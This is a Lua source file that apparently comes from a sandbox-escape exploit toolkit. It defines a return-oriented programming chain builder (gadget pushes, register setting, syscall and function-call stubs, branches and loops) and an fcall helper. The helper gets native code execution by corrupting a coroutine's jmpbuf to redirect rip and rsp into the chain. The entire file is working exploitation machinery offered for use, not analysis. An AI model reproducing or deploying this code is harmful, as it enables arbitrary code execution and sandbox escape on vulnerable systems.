
--
-- ropchain class
--
-- helper for creating rop chains
--

ropchain = {}
ropchain.__index = ropchain

setmetatable(ropchain, {
    __call = function(_, opt)  -- make class callable as constructor
        return ropchain:new(opt)
    end
})

function ropchain:new(opt)

    opt = opt or {}

    local self = setmetatable({}, ropchain)

    if not ropchain.dont_recurse then
        self.fcall_stub = ropchain.create_fcall_stub(opt.fcall_stub_padding_size or 0x2000)
    end

    self.stack_size = opt.stack_size or 0x2000
    self.stack_base = opt.stack_base and uint64(opt.stack_base) or memory.alloc(self.stack_size)
    self.align_offset = 0
    self.stack_offset = 0

    -- longjmp overwrites first stack slot with addr to ret gadget
    self.push_ret(self)
    
    -- align stack base to 16 bytes
    if self.stack_base:tonumber() % 16 ~= 0 then
        local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
        self.push_set_rsp(self, jmp_to)
        self.align_offset = jmp_to - self.stack_base
        self.stack_offset = 0
    end

    self.retval_addr = {}

    -- recover from call [rax+8] instruction
    self.recover_from_call = memory.alloc(0x10)
    memory.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])

    return self
end

function ropchain.create_fcall_stub(padding_size)

    local fcall_stub = {}
    fcall_stub.fn_addr = memory.alloc(padding_size) + (padding_size - 0x100)
    
    ropchain.dont_recurse = true
    local stub = ropchain({
        stack_base = fcall_stub.fn_addr,
    })
    ropchain.dont_recurse = false

    stub:align_stack()
    stub:push(0) -- fn addr
    fcall_stub.fn_addr = stub:get_rsp() - 0x8

    -- jmp back to ropchain
    stub:push_set_rsp(0)
    fcall_stub.return_addr = stub:get_rsp() - 0x8

    return fcall_stub
end

function ropchain:__tostring()

    local result = {}

    table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
        hex(self.stack_base), hex(self.stack_offset)))

    table.insert(result, string.format("fcall_stub.fn_addr: %s",
        hex(self.fcall_stub.fn_addr)))

    table.insert(result, string.format("fcall_stub.return_addr: %s\n",
        hex(self.fcall_stub.return_addr)))

    local qwords = memory.read_multiple_qwords(self.stack_base + self.align_offset, self.stack_offset / 8)

    local value_symbol = {}
    for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
        for k,v in pairs(t) do
            if k ~= "stack_pivot" then
                value_symbol[hex(v)] = k
            end
        end
    end

    local idx = 1
    while idx < #qwords+1 do
        local offset = 8 * (idx-1)
        local val = hex(qwords[idx])
        if value_symbol[val] then
            val = val .. string.format("\t; %s", value_symbol[val])
        end
        table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
        idx = idx + 1
    end

    return "\n" .. table.concat(result, "\n")
end

function ropchain:get_rsp() 
    return self.stack_base + self.align_offset + self.stack_offset
end

-- align stack to 16 bytes
function ropchain:align_stack()
    if self.stack_offset % 16 == 8 then
        self:push_ret()
    end
end

function ropchain:increment_stack()

    if self.stack_offset >= self.stack_size then
        error("ropchain storage exhausted")
    end

    local rsp = self:get_rsp()
    self.stack_offset = self.stack_offset + 8
    return rsp
end

function ropchain.resolve_value(v)
    if type(v) == "string" then
        return lua.addrof(v)+24
    elseif type(v) == "number" then
        return uint64(v)
    elseif is_uint64(v) then
        return v
    end
    errorf("ropchain.resolve_value: invalid type (%s)", type(v))
end

function ropchain:push(v)

    if self.finalized then
        error("ropchain has been finalized and cant be modified")
    end

    if self.enable_mock_push then
        self:increment_stack()
    else
        memory.write_qword(self:increment_stack(), ropchain.resolve_value(v))
    end
end

function ropchain:mock_push(callback)

    local before_prep_offset = self.stack_offset

    self.enable_mock_push = true
    callback()
    self.enable_mock_push = false
    
    local size = self.stack_offset - before_prep_offset
    self.stack_offset = before_prep_offset
    
    return size
end

function ropchain:push_ret()
    self:push(gadgets["ret"])
end

function ropchain:push_set_rsp(v) 
    self:push(gadgets["pop rsp; ret"])
    self:push(v)
end

function ropchain:push_set_rbp(v) 
    self:push(gadgets["pop rbp; ret"])
    self:push(v)
end

function ropchain:push_set_rax(v)
    self:push(gadgets["pop rax; ret"])
    self:push(v)
end

function ropchain:push_set_rbx(v)
    self:push(gadgets["pop rbx; ret"])
    self:push(v)
end

function ropchain:push_set_rcx(v)
    self:push(gadgets["pop rcx; ret"])
    self:push(v)
end
function ropchain:push_set_rdx(v)
    self:push(gadgets["pop rdx; ret"])
    self:push(v)
end

function ropchain:push_set_rdi(v)
    self:push(gadgets["pop rdi; ret"])
    self:push(v)
end

function ropchain:push_set_rsi(v)
    self:push(gadgets["pop rsi; ret"])
    self:push(v)
end

function ropchain:push_set_r8(v)
    self:push(gadgets["pop r8; ret"])
    self:push(v)
end

-- clobbers rax, rbx / rax, r13, r14, r15
function ropchain:push_set_r9(v)

    local set_r9_gadget = nil
    
    if gadgets["mov r9, rbx; call [rax + 8]"] then
        self:push_set_rax(self.recover_from_call)
        self:push_set_rbx(v)
        set_r9_gadget = gadgets["mov r9, rbx; call [rax + 8]"]
    else
        self:push_set_rax(self.recover_from_call)
        self:push(gadgets["pop r13 ; pop r14 ; pop r15 ; ret"])
        self:push(v)
        set_r9_gadget = gadgets["mov r9, r13; call [rax + 8]"]
    end

    self:push_ret()
    self:push_ret()
    self:push(set_r9_gadget)

    -- fix chain as `call` instruction corrupts set r9 gadget by pushing ret addr
    self:push_write_qword_memory(self:get_rsp() - 0x8, set_r9_gadget)
end

function ropchain:push_set_r9_wo_call(v) -- clobbers rax, rsi, r8
    temp_addr = bump.alloc(0x8)
    memory.write_qword(self.recover_from_call, v)
    self:push_set_rax(self.recover_from_call - 0x18)
    self:push_set_rsi(0)
    self:push_set_r8(temp_addr)
    self:push(gadgets["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"])
end

function ropchain:push_set_rax_from_memory(addr)
    self:push_set_rax(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
end

function ropchain:push_store_eax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], eax; ret"])
end

function ropchain:push_store_rax_data_and_add_into_memory(addr, num)
    self:push(gadgets["mov rax, [rax]; ret"])
    self:push_add_to_rax(num)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rax_data_into_memory(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
    self:push_set_rax(addr - 0x8)
    self:push(gadgets["mov [rax + 8], rcx; ret"])
end

function ropchain:push_store_rdx_into_memory(addr) -- clobbers rax
    self:push_set_rax(addr - 0x28)
    self:push(gadgets["mov [rax + 0x28], rdx; ret"])
end

function ropchain:push_store_rdi_into_memory(addr) -- clobbers rcx
    self:push_set_rcx(addr - 0xa0)
    self:push(gadgets["mov [rcx + 0xa0], rdi; ret"])
end

function ropchain:push_add_to_rax(num)  -- clobbers r8
    self:push_set_r8(num)
    self:push(gadgets["add rax, r8; ret"])
end

function ropchain:push_add_dword_memory_with_eax(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], eax; ret"])
end

function ropchain:push_add_dword_memory_with_ecx(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], ecx; ret"])
end

function ropchain:push_add_dword_memory_with_edi(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], edi; ret"])
end

function ropchain:push_add_dword_memory(addr, num)
    if gadgets["add [rbx], eax; ret"] then
        self:push_set_rax(uint64(num).l)
        self:push_add_dword_memory_with_eax(addr)
    elseif gadgets["add [rbx], ecx; ret"] then
        self:push_set_rcx(uint64(num).l)
        self:push_add_dword_memory_with_ecx(addr)
    else
        self:push_set_rdi(uint64(num).l)
        self:push_add_dword_memory_with_edi(addr)
    end
end

function ropchain:push_write_dword_memory(addr, v)
    self:push_set_rax(v)
    self:push_store_eax_into_memory(addr)
end

function ropchain:push_write_qword_memory(addr, v)  -- clobbers rdi
    self:push_set_rax(v)
    self:push_store_rax_into_memory(addr)
end

function ropchain:push_set_reg_from_reg(target_reg, src_reg)  -- clobbers rdi

    if not (src_reg == "rax" or src_reg == "rdi") then
        error("ropchain:push_set_reg_from_reg() accepts only rax or rdi as source reg")
    end

    local disp = (target_reg == "r9") and 0x30 or 0x20
    self["push_store_" .. src_reg .. "_into_memory"](self, self:get_rsp() + disp)  -- overwrite pop reg value
    self["push_set_" .. target_reg](self, 0)
end

function ropchain:push_set_reg_from_rax(reg)
    self:push_set_reg_from_reg(reg, "rax")
end

function ropchain:push_set_reg_from_rdi(reg)
    self:push_set_reg_from_reg(reg, "rdi")
end

function ropchain:push_set_reg_from_memory(reg, addr)
    self:push_set_rax_from_memory(addr)
    self:push_set_reg_from_rax(reg)
end

function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    if rdi then self:push_set_rdi(rdi) end
    if rsi then self:push_set_rsi(rsi) end
    if rdx then self:push_set_rdx(rdx) end
    if rcx then self:push_set_rcx(rcx) end
    if r8 then self:push_set_r8(r8) end
    if r9 then self:push_set_r9(r9) end
end

function ropchain:push_syscall_raw(syscall, prep_arg_callback)

    assert(syscall.fn_addr and syscall.syscall_no)

    local push_size = 0
    local push_cb = function()
        self:push_write_qword_memory(self:get_rsp() + push_size, syscall.fn_addr)
        if prep_arg_callback then
            prep_arg_callback()
        end
        self:push_set_rax(syscall.syscall_no)
    end

    push_size = self:mock_push(push_cb)
    push_cb()
    
    self:push(0) -- will be overwritten
end

function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_syscall_raw(syscall, function()
        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    end)
end

function ropchain:push_syscall_with_ret(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_store_retval()
end

-- if `is_rip_ptr` is set, rip is assumed to be ptr to the real address
function ropchain:push_fcall_raw(rip, prep_arg_callback, is_rip_ptr)

    local fcall_stub = self.fcall_stub

    if is_rip_ptr then
        self:push_set_rax_from_memory(rip)
        self:push_store_rax_into_memory(fcall_stub.fn_addr)
    else
        self:push_write_qword_memory(fcall_stub.fn_addr, rip)
    end

    local push_size = 0
    local push_cb = function()
        
        -- where to jmp after fcall stub
        self:push_write_qword_memory(fcall_stub.return_addr, self:get_rsp() + push_size)
        
        if prep_arg_callback then
            prep_arg_callback()
        end
        
        -- jmp to fcall stub
        self:push_set_rsp(fcall_stub.fn_addr)
    end

    push_size = self:mock_push(push_cb)
    push_cb()
end

function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall_raw(rip, function()
        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    end)
end

function ropchain:push_fcall_with_ret(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_store_retval()
end

function ropchain:push_store_retval()
    local buf = memory.alloc(8)
    table.insert(self.retval_addr, buf)
    self:push_store_rax_into_memory(buf)
end

function ropchain:get_retval()
    local retval = {}
    for i,v in ipairs(self.retval_addr) do
        table.insert(retval, memory.read_qword(v))
    end
    return retval
end

function ropchain:dispatch_jumptable_with_rax_index(jump_table)

    self:push_set_rcx(3)
    self:push(gadgets["shl rax, cl; ret"])

    self:push_add_to_rax(jump_table)
    self:push(gadgets["mov rax, [rax]; ret"])

    self:push_set_reg_from_rax("rsp")
end

-- only unsigned 32-bit comparison is supported
function ropchain:create_branch(value_address, op, compare_value)

    local jump_table = memory.alloc(0x10)

    if gadgets["cmp [rcx], eax; ret"] then
        self:push_set_rcx(value_address)
        self:push_set_rax(compare_value)
        self:push(gadgets["cmp [rcx], eax; ret"])
    else
        self:push_set_rax(value_address)
        self:push_set_rbx(compare_value)
        self:push(gadgets["cmp [rax], ebx; ret"])
    end

    self:push_set_rax(0)

    if op == "==" then
        self:push(gadgets["sete al; ret"])
    elseif op == "~=" then
        self:push(gadgets["setne al; ret"])
    elseif op == ">" then
        self:push(gadgets["seta al; ret"])
    elseif op == "<" then
        self:push(gadgets["setb al; ret"])
    else
        errorf("ropchain:create_branch: invalid op (%s)", op)
    end

    self:dispatch_jumptable_with_rax_index(jump_table)

    return jump_table
end

function ropchain:gen_loop(value_address, op, compare_value, callback)

    -- {
    local target_loop = self:get_rsp()
    callback()
    -- } while (memory[value_address] <op> compare_value])
    local jump_table = self:create_branch(value_address, op, compare_value)

    memory.write_multiple_qwords(jump_table, {
        self:get_rsp(), -- comparison false
        target_loop, -- comparison true
    })
end

function ropchain:restore_through_longjmp(jmpbuf)
    
    if self.finalized then
        return
    end

    self.jmpbuf = jmpbuf or memory.alloc(0x60)

    -- restore execution through longjmp
    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)

    self.finalized = true
end

-- corrupt coroutine's jmpbuf for code execution
function ropchain:execute_through_coroutine()

    local run_hax = function(lua_state_addr)

        -- backup original jmpbuf
        local jmpbuf_addr = memory.read_qword(lua_state_addr+0xa8) + 0x8
        memory.memcpy(self.jmpbuf, jmpbuf_addr, 0x60)

        -- overwrite registers in jmpbuf
        memory.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
        memory.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp

        assert(false) -- trigger exception
    end

    -- run ropchain
    local victim = coroutine.create(run_hax)
    coroutine.resume(victim, lua.addrof(victim))
    
    -- get return value(s)
    return unpack(self:get_retval())
end

--
-- fcall class
--
-- helper to execute function or system call through rop
--

fcall = {}
fcall.__index = fcall

setmetatable(fcall, {
    __call = function(_, fn_addr, syscall_no)  -- make class callable as constructor
        return fcall:new(fn_addr, syscall_no)
    end
})

function fcall:new(fn_addr, syscall_no)

    assert(fn_addr, "invalid function address")
    
    if not (fcall.chain or native_invoke) then
        fcall.create_initial_chain()
    end

    local self = setmetatable({}, fcall)
    self.fn_addr = fn_addr
    self.syscall_no = syscall_no
    return self
end

function fcall.create_initial_chain()

    local arg_addr = {
        fn_addr = memory.alloc(8),
        syscall_no = memory.alloc(8),
        rdi = memory.alloc(8),
        rsi = memory.alloc(8),
        rdx = memory.alloc(8),
        rcx = memory.alloc(8),
        r8 = memory.alloc(8),
        r9 = memory.alloc(8),
    }

    local chain = ropchain()

    local prep_arg_callback = function()
        chain:push_set_reg_from_memory("r9", arg_addr.r9)
        chain:push_set_reg_from_memory("r8", arg_addr.r8)
        chain:push_set_reg_from_memory("rcx", arg_addr.rcx)
        chain:push_set_reg_from_memory("rdx", arg_addr.rdx)
        chain:push_set_reg_from_memory("rsi", arg_addr.rsi)
        chain:push_set_reg_from_memory("rdi", arg_addr.rdi)
        chain:push_set_rax_from_memory(arg_addr.syscall_no)
    end
    
    chain:push_fcall_raw(arg_addr.fn_addr, prep_arg_callback, true)
    chain:push_store_retval()
    
    chain:restore_through_longjmp()

    fcall.arg_addr = arg_addr
    fcall.chain = chain
end

function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
    if native_invoke then
        return native.fcall_with_rax(self.fn_addr, self.syscall_no, rdi, rsi, rdx, rcx, r8, r9)
    else
        local arg_addr = fcall.arg_addr
        memory.write_qword(arg_addr.fn_addr, self.fn_addr)
        memory.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
        memory.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
        memory.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
        memory.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
        memory.write_qword(arg_addr.rcx, ropchain.resolve_value(rcx or 0))
        memory.write_qword(arg_addr.r8, ropchain.resolve_value(r8 or 0))
        memory.write_qword(arg_addr.r9, ropchain.resolve_value(r9 or 0))
        return fcall.chain:execute_through_coroutine()
    end
end

function fcall:__tostring()
    return string.format("address @ %s\n%s", hex(self.fn_addr), tostring(fcall.chain))
end